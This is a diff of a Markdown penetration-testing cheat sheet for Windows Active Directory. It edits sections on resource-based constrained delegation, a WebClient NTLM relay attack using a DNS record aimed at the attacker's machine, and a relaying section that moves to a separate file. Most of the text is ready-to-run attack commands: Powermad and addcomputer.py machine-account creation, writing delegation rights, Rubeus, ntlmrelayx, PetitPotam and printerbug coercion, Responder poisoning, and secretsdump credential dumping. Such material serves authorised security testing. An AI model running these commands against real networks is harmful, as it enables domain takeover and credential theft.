@@ -785,12 +785,11 @@ Get-DomainController
 
 #### Check if target doesn't have msds-AllowedToActOnBehalfOfOtherIdentity
 ```
-Get-DomainComputer <COMPUTERNAME> 
 Get-DomainComputer <COMPUTERNAME> | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
 ```
 
 #### Get access to a user or computer with SPN set
-- If not already have a user or computer with a SPN, Create a computer object!
+- If not already owned a user or computer with a SPN, Create a computer object!
 
 #### Check who can add computers to the domain
 ```
@@ -803,7 +802,7 @@ Get-DomainObject | Where-Object ms-ds-machineaccountquota | select-object ms-ds-
 - https://github.com/Kevin-Robertson/Powermad
 - https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
 ```
-import-module powermad
+Import-Module Powermad.ps1 
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 
 python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<USER>:<PASS> -dc-ip <DC IP>
@@ -812,12 +811,12 @@ python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<U
 #### Get the object SID
 - If already had a user with SPN use that user, otherwise use the computer you made!
 ```
-Get-DomainComputer fake01
+Get-DomainComputer FAKE01
 Get-DomainUser <USER>
 ```
 
 #### Creata a new raw security descriptor
-- Using the sid from previous command
+- Use the SID from previous command
 ``` 
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)"
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
@@ -834,20 +833,20 @@ Get-DomainComputer <TARGET COMPUTER> | Set-DomainObject -Set @{'msds-allowedtoac
 Get-DomainComputer <TARGET COMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity'
 ```
 
-#### Check raw security descriptor refering to the correct machine
+#### Check if raw security descriptor is refering to the correct machine
 ```
 $RawBytes = Get-DomainComputer <TARGET COMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity' | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
 (New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
 Get-DomainComputer <SID>
 ```
 
-#### Generate RC4 hash for the made computer object
+#### Calculate RC4 hash for the user/computer object
 - Only if you made a computer or you dont know the hash of the user
 ```
 .\Rubeus.exe hash /password:123456 /user:fake01 /domain:<DOMAIN>
 ```
 
-#### Check for user to impersonate
+#### Select user to impersonate
 - Preferably a user that would be admin on the machine (Check BloodHound).
 - User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
 ```
@@ -873,12 +872,12 @@ dir \\<COMPUTER>\C$
 
 ### Webclient Attack
 - Requirements:
-  - On a Domain Controller to have the LDAP server signing not enforced (default value)
-  - Able to add new machines accounts (default value this quota is 10)
-  - On the network, machines with WebClient running (some OS version had this service running by default or use the webclient starting trick from DTMSecurity)
-  - A DNS record pointing to the attacker’s machine (By default authenticated users can do this)
+  - On a Domain Controller to have the LDAP signing or LDAPS binding not enforced (default value)
+  - An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
+  - On the network, machines with WebClient running (some OS version had this service running by default or use the webclient starting trick from DTMSecurity). OneDrive, SharePoint and NextCloud also activate this on clients.
+  - A DNS record pointing to the attacker’s machine (By default authenticated users can create records)
 - https://www.bussink.net/rbcd-webclient-attack/
-- The blog says this is a requirement but it isn't "On a Domain Controller to have the LDAPS channel binding not required (default value)" if you create the user yourself and use the ```--escalate-user``` flag.
+- The blog says this is a requirement but it isn't "On a Domain Controller to have the LDAPS channel binding not required (default value)". You can relay to LDAP and use your own object with a SPN or relay to LDAPS and it will create it. If LDAP or use a specific user use the ```--escalate-user``` flag.
 
 #### Check who can add computers to the domain
 ```
@@ -934,19 +933,18 @@ dnstool.py -u <DOMAIN>\<USER> -a add -r <HOSTNAME> -d <ATTACKER IP> <DC IP>
 $creds = get-credential
 Invoke-DNSUpdate -DNSType A -DNSName <HOSTNAME> -DNSData <IP ATTACKING MACHINE> -Credential $creds -Realm <DOMAIN>
 ```
-- Didn't test powershell invoke-dnsupdate for this attack
 
 #### Create a new computer object
 - https://github.com/Kevin-Robertson/Powermad
 - https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
 ```
-import-module powermad
+import-module Powermad.ps1 
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 
 python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<USER>:<PASS> -dc-ip <DC IP>
 ```
 
-#### start NTLMRelay
+#### Start NTLMRelay
 ```
 sudo ntlmrelayx.py -t ldap://<DC IP> --http-port 8080 --delegate-access --escalate-user FAKE01$
 ```
@@ -954,13 +952,14 @@ sudo ntlmrelayx.py -t ldap://<DC IP> --http-port 8080 --delegate-access --escala
 #### Trigger target to authenticate to attacker machine
 - Use hostname we created in the DNS record
 - https://github.com/topotam/PetitPotam
-- - https://github.com/dirkjanm/krbrelayx
+- https://github.com/dirkjanm/krbrelayx
 ```
 python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@8080/a <TARGET>
+
 python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@8080/a
 ```
 
-#### Check for user to impersonate
+#### Select user to impersonate
 - Preferably a user that would be admin on the machine (Check BloodHound). Maybe another command to check if user is admin on a machine? Is that possible? We should check!
 - User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
 ```
@@ -980,8 +979,8 @@ python3 Secretsdump.py -k <TARGET FQDN>
 - Requirements:
   - Low priv shell on a machine
   - An account with a SPN associated (or able to add new machines accounts (default value this quota is 10))
-  - WebDAV Redirector feature must be installed on the victim machine. (W10 has it by default, but manually installed on server 2016 and later)
-  - A DNS record pointing to the attacker’s machine (By default authenticated users can do this)
+  - On the network, machines with WebClient running (some OS version had this service running by default or use the webclient starting trick from DTMSecurity). OneDrive, SharePoint and NextCloud also activate this on clients.
+  - A DNS record pointing to the attacker’s machine (By default authenticated users can create records)
 - https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/
 
 #### Check who can add computers to the domain
@@ -1034,69 +1033,8 @@ Psexec.py -k -no-pass <TARGET FQDN>
 
 ## Relaying attacks
 - https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
-#### Check if LLMNR and NBT-NS is used
-- Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS).
-- Use ```-A``` for analyze mode.
-```
-Responder -I eth0 -A
-```
 
-### SMB Relaying
-#### Check for SMB hosts without SMB signing
-```
-crackmapexec smb <IP RANGE> --gen-relay-list smb_hosts_nosigning.txt
-```
-
-#### Poison Requests
-```
-Responder -I eth0
-```
-
-#### Relay requests SMB and dump SAM
-- we have to modify the Responder.conf file and disable the HTTP and SMB servers (as NTLM relay will be our SMB and HTTP server).
-- the ```-d``` flag has now been changed from “Enable answers for NETBIOS domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False” to “Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False”. It should also be noted that ```-d``` as it is now CAN have an impact on your client’s network, as you are effectively poisoning the WPAD file over DHCP, which does not always revert back immediately once you stop the attack. It will likely require a reboot.
-```
-Responder -I eth0
-ntlmrelayx.py -tf smb_hosts_nosigning.txt 
-```
-
-#### Relay requests SMB and keep SMB sessions open
-- Use the ```socks``` option to be able to use the ```socks``` command to get a nice overview of the relayed attempts. It will also keep the SMB connection open indefinitely. 
-
-```
-Responder -I eth0
-ntlmrelayx.py -tf smb_hosts_nosigning.txt --socks
-
-# Get overview of all relay attempts
-ntlmrelayx> socks
-
-# Change socks proxy
-sudo vim /etc/proxychains4.conf
-socks4 127.0.0.1 1080
-
-# Use proxychains and it will ignore the password value and use the relay credential instead
-proxychains python3 secretsdump.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>
-
-# Also possible to access shares on the network, for example if user is not local admin
-proxychains python3 smbclient.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>
-```
-
-### LDAP(s) Relaying
-- When relaying to LDAP check if signing isn't required
-- When relaying to LDAPS check if binding isn't required
-
-#### Check binding and signing
-- https://github.com/zyn3rgy/LdapRelayScan
-```
-python3 LdapRelayScan.py -method BOTH -dc-ip <IP> -u <USER> -p <PASSWORD>
-```
-
-#### Start NTLMRelay
-- Requires a computeraccount created (in example FAK01$). See more info on relaying to LDAP in the Resource Based Constrained Delegation section.
-```
-sudo ntlmrelayx.py -t ldap://<DC IP> --http-port 8080 --delegate-access --escalate-user FAKE01$
-sudo ntlmrelayx.py -t ldaps://<DC IP> --http-port 8080 --delegate-access --escalate-user FAKE01$
-```
+[Relaying section](windows-ad/relaying.md)
 
 ## MS Exchange
 - Outlook rules and Outlook Forms are synced to all clients with the mailbox active.
